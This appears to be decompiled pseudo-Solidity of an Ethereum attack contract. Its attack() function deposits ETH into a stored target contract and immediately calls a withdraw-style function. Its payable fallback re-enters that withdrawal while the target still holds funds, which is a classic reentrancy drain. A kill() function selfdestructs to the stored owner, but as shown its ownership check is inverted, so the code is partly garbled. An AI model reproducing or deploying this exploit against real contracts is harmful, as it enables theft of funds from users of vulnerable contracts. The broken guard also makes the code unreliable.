contract main {


// =======================  Init code  ======================


address stor0;
address stor1;

function _fallback() {
    stor0 = msg.sender
    stor1 = code.data[669 len 20]
    return code.data[93 len 564]
}



// =====================  Runtime code  =====================


address stor0;
address sub_f66ad59aAddress;

function sub_f66ad59a(?) {
    return sub_f66ad59aAddress
}

function kill() {
    if stor0 != msg.sender:
    selfdestruct(stor0)
}

function _fallback() payable {
    if eth.balance(sub_f66ad59aAddress) >= msg.value:
        if gas_remaining >= 40000:
            require ext_code.size(sub_f66ad59aAddress)
            call sub_f66ad59aAddress.0xccd6e5b6 with:
                 gas gas_remaining - 50 wei
                args msg.value, this.address
            require ext_call.success
}

function attack() payable {
    require ext_code.size(sub_f66ad59aAddress)
    call sub_f66ad59aAddress.0xd0e30db0 with:
       value msg.value wei
         gas gas_remaining - 9050 wei
    require ext_call.success
    require ext_code.size(sub_f66ad59aAddress)
    call sub_f66ad59aAddress.0xccd6e5b6 with:
         gas gas_remaining - 50 wei
        args msg.value, this.address
    require ext_call.success
}



}
